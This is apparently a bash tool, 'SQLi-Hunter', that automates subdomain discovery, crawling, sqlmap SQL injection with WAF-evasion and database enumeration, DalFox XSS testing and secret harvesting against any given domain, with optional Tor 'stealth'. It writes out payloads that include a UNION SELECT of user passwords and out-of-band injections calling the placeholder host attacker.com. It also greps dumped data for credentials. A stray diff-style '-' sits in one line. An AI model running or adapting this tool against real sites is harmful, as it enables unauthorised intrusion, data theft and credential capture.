#!/usr/bin/env bash

# SQLi-Hunter v1.0 - Advanced Subdomain, SQLi, XSS (DalFox), and Secrets Smasher

shopt -s nullglob

# Banner
banner() {
    echo -e "\033[31m"
    echo "   _________      .__  .__            ___ ___               __                "
    echo "  /   _____/ _____|  | |__|          /   |   \ __ __  _____/  |_  ___________ "
    echo "  \_____  \ / ____/  | |  |  ______ /    ~    \  |  \/    \   __\/ __ \_  __ \\"
    echo "  /        < <_|  |  |_|  | /_____/ \    Y    /  |  /   |  \  | \  ___/|  | \/"
    echo " /_______  /\__   |____/__|          \___|_  /|____/|___|  /__|  \___  >__|   "
    echo "         \/    |__|                        \/            \/          \/       "
    echo -e "\033[0m"
    echo " SQLi Hunter v1.0 - by manojxshrestha"
    echo ""
}

# Timestamped Logging
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Usage Info
usage() {
    banner
    echo "Usage: ./sqli-hunter.sh [-d domain.tld] [-l list.txt] [-s] [-m] [-a] [-p] [-o OUTPUT] [-v] [-w] [-r] [-S] [-x] [-y]"
    echo "TARGET: -d domain.tld | -l list.txt"
    echo "MODE: -s (single) | -m (multi) | -a (all) | -p (passive)"
    echo "GENERAL: -o output/path | -t (tools) | -h (help)"
    echo "ADVANCED: -v (verbose) | -w (WAF evasion) | -r (report) | -S (stealth) | -x (XSS with DalFox) | -y (verify SQLi)"
    echo "EX: ./sqli-hunter.sh -d http://example.com -m -v -w -r -S -x -y"
    exit 0
}

# Check Tools
check_tools() {
    log "Checking tools..."
    tools=("subfinder" "curl" "jq" "waymore" "katana" "httpx" "gf" "uro" "qsreplace" "sqlmap" "anew" "dalfox")
    optional=("pdftotext" "torsocks")
    missing=0
    for tool in "${tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "  [+] $tool - Found at $(which "$tool")"
            # Version check for key tools, but don’t fail the run
            case $tool in
                subfinder)
                    subfinder -version >/dev/null 2>&1 || log "  [i] $tool version check failed—might still work."
                    ;;
                sqlmap)
                    sqlmap --version >/dev/null 2>&1 || log "  [i] $tool version check failed—might still work."
                    ;;
                katana)
                    katana -version >/dev/null 2>&1 || log "  [i] $tool version check failed—might still work."
                    ;;
                dalfox)
                    dalfox --version >/dev/null 2>&1 || log "  [i] $tool version check failed—might still work."
                    ;;
            esac
        else
            echo "  [-] $tool - Missing!"
            log "$tool missing! Install: go install github.com/hahwul/dalfox/v2@latest (for dalfox, adjust for others)"
            missing=1
        fi
    done
    for tool in "${optional[@]}"; do
        command -v "$tool" >/dev/null 2>&1 && echo "  [+] $tool - Found (optional)" || echo "  [i] $tool - Missing (optional, secrets/stealth may skip)"
    done
    echo "  [i] crt.sh - Using curl + jq for https://crt.sh"
    python3 -c "import requests, termcolor" 2>/dev/null || { log "Python needs requests and termcolor! Install: pip3 install requests termcolor"; missing=1; }
    [ $missing -eq 0 ] && log "All core tools ready!" || { log "Core tools missing! Install them and retry."; exit 1; }
}


# Setup Payloads
setup_payloads() {
    log "Setting up payloads in ./payloads/..."
    mkdir -p "$payload_dir"
    [ -f "$payload_dir/blind_time.txt" ] || echo -e "1 AND SLEEP(5)\n1' AND SLEEP(5)--" > "$payload_dir/blind_time.txt"
    [ -f "$payload_dir/blind_boolean.txt" ] || echo -e "1 AND 1=1\n1 AND 1=2" > "$payload_dir/blind_boolean.txt"
    [ -f "$payload_dir/errors.txt" ] || echo -e "1'\n1/0" > "$payload_dir/errors.txt"
    [ -f "$payload_dir/union.txt" ] || echo -e "1 UNION SELECT 1,2,3\n1' UNION SELECT NULL,username,password FROM users--" > "$payload_dir/union.txt"
    [ -f "$payload_dir/oob.txt" ] || echo -e "1; EXEC master.dbo.xp_dirtree '\\\\attacker.com\\x'\n1 AND LOAD_FILE('\\\\attacker.com\\x')" > "$payload_dir/oob.txt"
    [ -f "$payload_dir/xss.txt" ] || echo -e "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>" > "$payload_dir/xss.txt"
}

# Validate Domain
validate_domain() {
    if [[ -z "$1" || ! "$1" =~ ^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$ ]]; then
        log "Error: Invalid domain. Use https://example.com."
        exit 1
    fi
    curl -s -I "$1" --connect-timeout 10 >/dev/null 2>&1 || { log "Domain $1 unreachable!"; exit 1; }
}

# Run Command or Die
run_or_die() {
    local cmd=("$@")
    local err_file=$(mktemp -t sqli-hunter-$$-XXXXXX)
    if [ "$VERBOSE" = "true" ]; then
        log "Running: ${cmd[*]}"
        if [ "$STEALTH" = "true" ] && command -v torsocks >/dev/null 2>&1; then
            sleep $((RANDOM % 5 + 1))
            torsocks "${cmd[@]}" 2>"$err_file" || { log "Stealth command '${cmd[*]}' failed: $(cat "$err_file")"; rm -f "$err_file"; return 1; }
        else
            "${cmd[@]}" 2>"$err_file" || { log "Command '${cmd[*]}' failed: $(cat "$err_file")"; rm -f "$err_file"; return 1; }
        fi
    else
        if [ "$STEALTH" = "true" ] && command -v torsocks >/dev/null 2>&1; then
            sleep $((RANDOM % 5 + 1))
            torsocks "${cmd[@]}" 2>"$err_file" || { log "Stealth command '${cmd[*]}' failed: $(cat "$err_file")"; rm -f "$err_file"; return 1; }
-        else
            "${cmd[@]}" 2>"$err_file" || { log "Command '${cmd[*]}' failed: $(cat "$err_file")"; rm -f "$err_file"; return 1; }
        fi
    fi
    rm -f "$err_file"
    return 0
}

# Summarize Results
summarize_results() {
    local domain_no_proto="$1"
    local target_dir="$OUTPUT_DIR/$domain_no_proto"
    log "Summary for $domain_no_proto:"
    log "Vulnerabilities:"
    vuln_files=("$target_dir/Vuln"/*.txt)
    if [ ${#vuln_files[@]} -gt 0 ]; then
        for f in "${vuln_files[@]}"; do
            [ -f "$f" ] && [ -s "$f" ] && log "  $(basename "$f"): $(wc -l < "$f") hits" || log "  $(basename "$f"): 0 hits"
        done
    else
        log "  No vulnerability files found."
    fi
    log "Secrets Found:"
    secret_files=("$target_dir/secrets"/*.txt)
    if [ ${#secret_files[@]} -gt 0 ]; then
        for f in "${secret_files[@]}"; do
            [ -f "$f" ] && [ -s "$f" ] && log "  $(basename "$f"): $(wc -l < "$f") hits" || log "  $(basename "$f"): 0 hits"
        done
    else
        log "  No secrets files found."
    fi
    [ "$REPORT" = "true" ] && generate_report "$domain_no_proto"
}

# Generate Report
generate_report() {
    local domain_no_proto="$1"
    local target_dir="$OUTPUT_DIR/$domain_no_proto"
    local report_file="$target_dir/report.txt"
    {
        echo "SQLi Hunter v2.4 Report - $domain_no_proto"
        echo "Generated: $(date)"
        echo "Target: $domain_no_proto"
        echo "Mode: $MODE"
        echo "Options: Verbose=$VERBOSE, WAF Evasion=$WAF_EVASION, Stealth=$STEALTH, XSS=$XSS_TEST, Verify=$VERIFY"
        echo "----------------------------------------"
        echo "Vulnerabilities:"
        vuln_files=("$target_dir/Vuln"/*.txt)
        if [ ${#vuln_files[@]} -gt 0 ]; then
            for f in "${vuln_files[@]}"; do
                [ -f "$f" ] && [ -s "$f" ] && echo "  $(basename "$f"): $(wc -l < "$f") hits" || echo "  $(basename "$f"): 0 hits"
            done
        else
            echo "  No vulnerabilities found."
        fi
        echo "Verified SQLi Databases:"
        if [ -d "$target_dir/Vuln/verified" ] && compgen -G "$target_dir/Vuln/verified/*log" >/dev/null; then
            grep -h "Database:" "$target_dir/Vuln/verified"/*log 2>/dev/null | sort -u | sed 's/^/  /' || echo "  No databases enumerated."
        else
            echo "  No verified databases found."
        fi
        echo "Secrets Discovered:"
        secret_files=("$target_dir/secrets"/*.txt)
        if [ ${#secret_files[@]} -gt 0 ]; then
            for f in "${secret_files[@]}"; do
                [ -f "$f" ] && [ -s "$f" ] && echo "  $(basename "$f"): $(wc -l < "$f") hits" || echo "  $(basename "$f"): 0 hits"
            done
        else
            echo "  No secrets discovered."
        fi
        echo "----------------------------------------"
        echo "Details in $target_dir/"
    } > "$report_file"
    log "Report saved to $report_file"
}

# Single Scan
single_scan() {
    local domain="$1"
    local out_dir="$OUTPUT_DIR"
    validate_domain "$domain"
    domain_no_proto=$(echo "$domain" | sed 's,^https\?://,,;s,/.*$,,;s,www\.,,')
    local target_dir="$out_dir/$domain_no_proto"
    mkdir -p "$target_dir/urls" "$target_dir/parameters" "$target_dir/Vuln" "$target_dir/secrets"
    local urls_dir="$target_dir/urls"
    local params_file="$target_dir/parameters/params.txt"
    log "Single scan on $domain..."
    log "Grabbing URLs..."
    run_or_die katana -u "$domain" -d 5 -c 10 -o "$urls_dir/katana_urls.txt"
    run_or_die waymore -i "$domain" -n -mode U -t 5 -oU "$urls_dir/waymore_urls.txt"
    cat "$urls_dir/katana_urls.txt" "$urls_dir/waymore_urls.txt" | anew > "$urls_dir/total_urls.txt"
    log "Found $(wc -l < "$urls_dir/total_urls.txt") URLs."
    log "Sniffing params..."
    cat "$urls_dir/total_urls.txt" | uro -f hasparams | gf sqli | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u > "$params_file"
    log "Got $(wc -l < "$params_file") params."
    if [ -s "$params_file" ] && [ "$PASSIVE" != "true" ]; then
        run_sqli_tests "$domain_no_proto" "$out_dir" "$params_file"
        [ "$XSS_TEST" = "true" ] && run_xss_tests "$domain_no_proto" "$out_dir" "$params_file"
    else
        log "No params to test or passive mode—skipping tests."
    fi
    hunt_secrets "$domain_no_proto" "$out_dir" "$urls_dir/total_urls.txt"
}

# Multi-Level Scan
multi_scan() {
    local domain="$1"
    local out_dir="$OUTPUT_DIR"
    validate_domain "$domain"
    domain_no_proto=$(echo "$domain" | sed 's,^https\?://,,;s,/.*$,,;s,www\.,,')
    local target_dir="$out_dir/$domain_no_proto"
    mkdir -p "$target_dir/subdomains" "$target_dir/urls" "$target_dir/parameters" "$target_dir/Vuln" "$target_dir/secrets"
    local subs_dir="$target_dir/subdomains"
    local urls_dir="$target_dir/urls"
    local params_file="$target_dir/parameters/params.txt"
    log "Multi-level scan on $domain..."

    log "Hunting subdomains with subfinder..."
    run_or_die subfinder -d "$domain_no_proto" -all -recursive -o "$subs_dir/subfinder_subs.txt"
    log "Found $(wc -l < "$subs_dir/subfinder_subs.txt") subs from subfinder."
    log "Pulling subs from crt.sh..."
    curl -s "https://crt.sh/?q=%25.$domain_no_proto&output=json" > "$subs_dir/crtsh_raw.json"
    if jq -e . "$subs_dir/crtsh_raw.json" >/dev/null 2>&1; then
        jq -r '.[].name_value' "$subs_dir/crtsh_raw.json" | sed 's/\*\.//g' | grep -Eo "([a-zA-Z0-9.-]+\.)*$domain_no_proto" | sort -u > "$subs_dir/crtsh_subs.txt"
        log "Got $(wc -l < "$subs_dir/crtsh_subs.txt") subs from crt.sh."
    else
        log "crt.sh failed or empty—skipping."
        touch "$subs_dir/crtsh_subs.txt"
    fi

    log "Combining and filtering live subs..."
    cat "$subs_dir/subfinder_subs.txt" "$subs_dir/crtsh_subs.txt" | anew > "$subs_dir/all_subs.txt"
    if [ ! -s "$subs_dir/all_subs.txt" ]; then
        log "No subdomains found from subfinder or crt.sh—aborting."
        exit 1
    fi
    httpx -l "$subs_dir/all_subs.txt" -silent -status-code -p 80,443,2082,2095,2096,8080,8443,8880 -retries 2 -mc 200,301,302,401,403,500 -o "$subs_dir/alive_urls.txt" -t 20 -rl 20 || { log "Httpx failed—using all subs."; [ -s "$subs_dir/all_subs.txt" ] && cp "$subs_dir/all_subs.txt" "$subs_dir/alive_urls.txt" || log "No subs to fall back to—alive_urls.txt will be empty."; }
    grep "200" "$subs_dir/alive_urls.txt" | awk '{print $1}' > "$subs_dir/200_subs.txt" 2>/dev/null
    if [ -s "$subs_dir/200_subs.txt" ]; then
        log "Got $(wc -l < "$subs_dir/200_subs.txt") live 200 OK subs."
        crawl_file="$subs_dir/200_subs.txt"
    else
        log "No 200 OK subs—falling back to $(wc -l < "$subs_dir/alive_urls.txt") live subs."
        awk '{print $1}' "$subs_dir/alive_urls.txt" > "$subs_dir/live_subs.txt"
        crawl_file="$subs_dir/live_subs.txt"
    fi

    if [ ! -s "$crawl_file" ]; then
        log "No live subs to crawl—skipping URL extraction."
        touch "$urls_dir/total_urls.txt"
        return
    fi

    log "Crawling URLs from live subs..."
    run_or_die katana -list "$crawl_file" -d 5 -c 10 -o "$urls_dir/katana_urls.txt"
    touch "$urls_dir/waymore_urls.txt"
    xargs -n 1 -P 5 -I {} sh -c "tmp=\$(mktemp -t sqli-hunter-$$-XXXXXX); run_or_die waymore -i '{}' -n -mode U -t 5 -oU \"\$tmp\" && cat \"\$tmp\" >> '$urls_dir/waymore_urls.txt' && rm -f \"\$tmp\"" < "$crawl_file"
    cat "$urls_dir/katana_urls.txt" "$urls_dir/waymore_urls.txt" | anew > "$urls_dir/total_urls.txt"
    log "Found $(wc -l < "$urls_dir/total_urls.txt") URLs."

    log "Extracting params..."
    cat "$urls_dir/total_urls.txt" | uro -f hasparams | gf sqli | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u > "$params_file"
    log "Got $(wc -l < "$params_file") params."

    if [ -s "$params_file" ] && [ "$PASSIVE" != "true" ]; then
        run_sqli_tests "$domain_no_proto" "$out_dir" "$params_file"
        [ "$XSS_TEST" = "true" ] && run_xss_tests "$domain_no_proto" "$out_dir" "$params_file"
    else
        log "No params to test or passive mode—skipping tests."
    fi
    hunt_secrets "$domain_no_proto" "$out_dir" "$urls_dir/total_urls.txt"
}

# SQLi Tests
run_sqli_tests() {
    local domain_no_proto="$1"
    local out_dir="$2"
    local params_file="$3"
    local vuln_dir="$out_dir/$domain_no_proto/Vuln"
    mkdir -p "$vuln_dir"

    if [ ! -s "$params_file" ]; then
        log "Params file $params_file is empty or missing—skipping SQLi tests and creating empty result files."
        touch "$vuln_dir/blind_bool.txt" "$vuln_dir/blind_time.txt" "$vuln_dir/errors.txt" "$vuln_dir/union.txt" "$vuln_dir/oob.txt"
        return
    fi

    log "Running sqlmap for all SQLi types..."
    sqlmap_cmd=(sqlmap -m "$params_file" --batch --level 3 --risk 2 --technique BEUSTO --output-dir "$vuln_dir/sqlmap_results")
    [ "$WAF_EVASION" = "true" ] && sqlmap_cmd+=(--random-agent --delay 1 --tamper=space2comment)
    [ "$STEALTH" = "true" ] && sqlmap_cmd+=(--threads 1 --delay 2)
    [ "$VERBOSE" = "true" ] && log "SQLmap command: ${sqlmap_cmd[*]}"
    run_or_die "${sqlmap_cmd[@]}" || log "SQLmap failed—check logs in $vuln_dir/sqlmap_results"

    if [ "$VERIFY" = "true" ] && [ -d "$vuln_dir/sqlmap_results" ]; then
        log "Verifying SQLi hits with database enumeration..."
        sqlmap_verify_cmd=(sqlmap -m "$params_file" --batch --dbs --output-dir "$vuln_dir/verified" --technique BEUSTO)
        [ "$WAF_EVASION" = "true" ] && sqlmap_verify_cmd+=(--random-agent --delay 1 --tamper=space2comment)
        [ "$STEALTH" = "true" ] && sqlmap_verify_cmd+=(--threads 1 --delay 2)
        [ "$VERBOSE" = "true" ] && log "SQLmap verify command: ${sqlmap_verify_cmd[*]}"
        run_or_die "${sqlmap_verify_cmd[@]}" || log "SQLmap verification failed—check $vuln_dir/verified"
    fi

    if [ -d "$vuln_dir/sqlmap_results" ] && compgen -G "$vuln_dir/sqlmap_results/*log" >/dev/null; then
        grep -i "boolean-based blind" "$vuln_dir/sqlmap_results"/*log > "$vuln_dir/blind_bool.txt" 2>/dev/null || touch "$vuln_dir/blind_bool.txt"
        grep -i "time-based blind" "$vuln_dir/sqlmap_results"/*log > "$vuln_dir/blind_time.txt" 2>/dev/null || touch "$vuln_dir/blind_time.txt"
        grep -i "error-based" "$vuln_dir/sqlmap_results"/*log > "$vuln_dir/errors.txt" 2>/dev/null || touch "$vuln_dir/errors.txt"
        grep -i "union query" "$vuln_dir/sqlmap_results"/*log > "$vuln_dir/union.txt" 2>/dev/null || touch "$vuln_dir/union.txt"
        grep -i "out-of-band" "$vuln_dir/sqlmap_results"/*log > "$vuln_dir/oob.txt" 2>/dev/null || touch "$vuln_dir/oob.txt"
        log "Hits - Blind Boolean: $(wc -l < "$vuln_dir/blind_bool.txt")"
        log "Hits - Blind Time: $(wc -l < "$vuln_dir/blind_time.txt")"
        log "Hits - Error-Based: $(wc -l < "$vuln_dir/errors.txt")"
        log "Hits - Union: $(wc -l < "$vuln_dir/union.txt")"
        log "Hits - OOB: $(wc -l < "$vuln_dir/oob.txt")"
    else
        log "SQLmap ran but no logs found—check $vuln_dir/sqlmap_results for issues."
        touch "$vuln_dir/blind_bool.txt" "$vuln_dir/blind_time.txt" "$vuln_dir/errors.txt" "$vuln_dir/union.txt" "$vuln_dir/oob.txt"
    fi
}

# XSS Tests
run_xss_tests() {
    local domain_no_proto="$1"
    local out_dir="$2"
    local params_file="$3"
    local vuln_dir="$out_dir/$domain_no_proto/Vuln"
    mkdir -p "$vuln_dir"

    if [ ! -s "$params_file" ]; then
        log "Params file $params_file is empty or missing—skipping XSS tests and creating empty result file."
        touch "$vuln_dir/xss.txt"
        return
    fi

    log "Testing XSS with DalFox..."
    dalfox_cmd=(dalfox file "$params_file" --custom-payload "$payload_dir/xss.txt" -o "$vuln_dir/xss.txt" --format plain --silence)
    [ "$WAF_EVASION" = "true" ] && dalfox_cmd+=(--waf-evasion)
    [ "$VERBOSE" = "true" ] && log "DalFox command: ${dalfox_cmd[*]}"
    if [ "$STEALTH" = "true" ] && command -v torsocks >/dev/null 2>&1; then
        run_or_die torsocks "${dalfox_cmd[@]}"
    else
        run_or_die "${dalfox_cmd[@]}"
    fi
    [ -f "$vuln_dir/xss.txt" ] && log "XSS Hits: $(wc -l < "$vuln_dir/xss.txt")" || log "No XSS hits found."
}

# Hunt Secrets
hunt_secrets() {
    local domain_no_proto="$1"
    local out_dir="$2"
    local urls_file="$3"
    local secrets_dir="$out_dir/$domain_no_proto/secrets"
    mkdir -p "$secrets_dir"
    [ ! -s "$urls_file" ] && { log "No URLs to hunt secrets from—skipping."; return; }
    log "Hunting secrets from URLs..."

    if command -v pdftotext >/dev/null 2>&1; then
        cat "$urls_file" | grep -aE '\.pdf' | while IFS= read -r url; do
            tmp_pdf=$(mktemp -t sqli-hunter-$$-XXXXXX)
            curl -s "$url" --connect-timeout 10 -o "$tmp_pdf" && [ -s "$tmp_pdf" ] && pdftotext -q "$tmp_pdf" - 2>/dev/null | grep -Eai "(internal use only|confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive)" && echo "$url" >> "$secrets_dir/sensitive_pdfs.txt.tmp"
            rm -f "$tmp_pdf"
        done
        [ -f "$secrets_dir/sensitive_pdfs.txt.tmp" ] && sort -u "$secrets_dir/sensitive_pdfs.txt.tmp" > "$secrets_dir/sensitive_pdfs.txt" && rm -f "$secrets_dir/sensitive_pdfs.txt.tmp" || { log "No sensitive PDFs found—creating empty result file."; touch "$secrets_dir/sensitive_pdfs.txt"; }
        log "Found $(wc -l < "$secrets_dir/sensitive_pdfs.txt") sensitive PDFs."
    else
        log "pdftotext missing—skipping PDF checks and creating empty result file."
        touch "$secrets_dir/sensitive_pdfs.txt"
    fi

    cat "$urls_file" | grep -aE '\.zip|\.tar\.gz|\.tgz|\.sql|\.bak|\.backup' > "$secrets_dir/backup_db_files.txt"
    log "Found $(wc -l < "$secrets_dir/backup_db_files.txt") backup/DB files."

    cat "$urls_file" | grep -aE '(s3\.amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com)' > "$secrets_dir/cloud_urls.txt"
    [ -f "$secrets_dir/cloud_urls.txt" ] && [ -s "$secrets_dir/cloud_urls.txt" ] && {
        while IFS= read -r url; do
            curl -s -I "$url" --connect-timeout 10 | grep -q "200 OK" && echo "$url" >> "$secrets_dir/public_cloud.txt"
        done < "$secrets_dir/cloud_urls.txt"
        [ -f "$secrets_dir/public_cloud.txt" ] && log "Found $(wc -l < "$secrets_dir/public_cloud.txt") public cloud buckets." || log "No public cloud buckets found or check failed."
    } || log "No cloud storage URLs detected or empty—skipping bucket check."

    cat "$urls_file" | grep -aE '(AKIA[0-9A-Z]{16}|[0-9a-f]{40}|sk_[0-9a-f]{32})' > "$secrets_dir/api_keys.txt"
    log "Found $(wc -l < "$secrets_dir/api_keys.txt") potential API keys."

    [ -d "$out_dir/$domain_no_proto/Vuln/sqlmap_results" ] && {
        grep -Eai '(username|password|user|pass|login|cred|key|token)' "$out_dir/$domain_no_proto/Vuln/sqlmap_results"/*dump* "$out_dir/$domain_no_proto/Vuln/sqlmap_results"/*log 2>/dev/null > "$secrets_dir/db_credentials.txt" || touch "$secrets_dir/db_credentials.txt"
        log "Found $(wc -l < "$secrets_dir/db_credentials.txt") potential DB creds."
    } || { log "No SQLmap results to check for DB creds—skipping."; touch "$secrets_dir/db_credentials.txt"; }
}

# Global vars
DOMAIN=""
LIST=""
MODE=""
OUTPUT_DIR="./Recon"
payload_dir="./payloads"
PASSIVE="false"
VERBOSE="false"
WAF_EVASION="false"
REPORT="false"
STEALTH="false"
XSS_TEST="false"
VERIFY="false"

# Parse args
while [[ $# -gt 0 ]]; do
    case $1 in
        -d) DOMAIN="$2"; shift 2 ;;
        -l) LIST="$2"; shift 2 ;;
        -s|--single) MODE="single"; shift ;;
        -m|--multi) MODE="multi"; shift ;;
        -a|--all) MODE="all"; shift ;;
        -p|--passive) PASSIVE="true"; shift ;;
        -o) OUTPUT_DIR="$2"; shift 2 ;;
        -t) banner; check_tools; exit 0 ;;
        -h|--help) usage ;;
        -v|--verbose) VERBOSE="true"; shift ;;
        -w|--waf-evasion) WAF_EVASION="true"; shift ;;
        -r|--report) REPORT="true"; shift ;;
        -S|--stealth) STEALTH="true"; shift ;;
        -x|--xss) XSS_TEST="true"; shift ;;
        -y|--verify) VERIFY="true"; shift ;;
        *) log "Unknown flag: $1"; usage ;;
    esac
done

# Main execution
banner
check_tools
setup_payloads
mkdir -p "$OUTPUT_DIR" || { log "Can’t write to $OUTPUT_DIR! Check perms."; exit 1; }
trap 'rm -f /tmp/sqli-hunter-$$-* 2>/dev/null' EXIT  # Clean up temp files with PID-specific pattern

if [ -n "$LIST" ] && [ -f "$LIST" ]; then
    log "Scanning from $LIST..."
    while IFS= read -r target; do
        domain_no_proto=$(echo "$target" | sed 's,^https\?://,,;s,/.*$,,;s,www\.,,')
        [ "$MODE" = "single" ] || [ "$MODE" = "all" ] && { single_scan "$target" "$OUTPUT_DIR"; summarize_results "$domain_no_proto"; }
        [ "$MODE" = "multi" ] || [ "$MODE" = "all" ] && { multi_scan "$target" "$OUTPUT_DIR"; summarize_results "$domain_no_proto"; }
    done < "$LIST"
elif [ -n "$DOMAIN" ]; then
    log "Scanning $DOMAIN..."
    domain_no_proto=$(echo "$DOMAIN" | sed 's,^https\?://,,;s,/.*$,,;s,www\.,,')
    [ -z "$MODE" ] && { log "No mode specified! Use -s, -m, -a, or -p."; usage; }
    [ "$MODE" = "single" ] || [ "$MODE" = "all" ] && single_scan "$DOMAIN" "$OUTPUT_DIR"
    [ "$MODE" = "multi" ] || [ "$MODE" = "all" ] && multi_scan "$DOMAIN" "$OUTPUT_DIR"
    summarize_results "$domain_no_proto"
else
    log "No target! Use -d or -l."
    usage
fi

log "Done! Look in $OUTPUT_DIR."
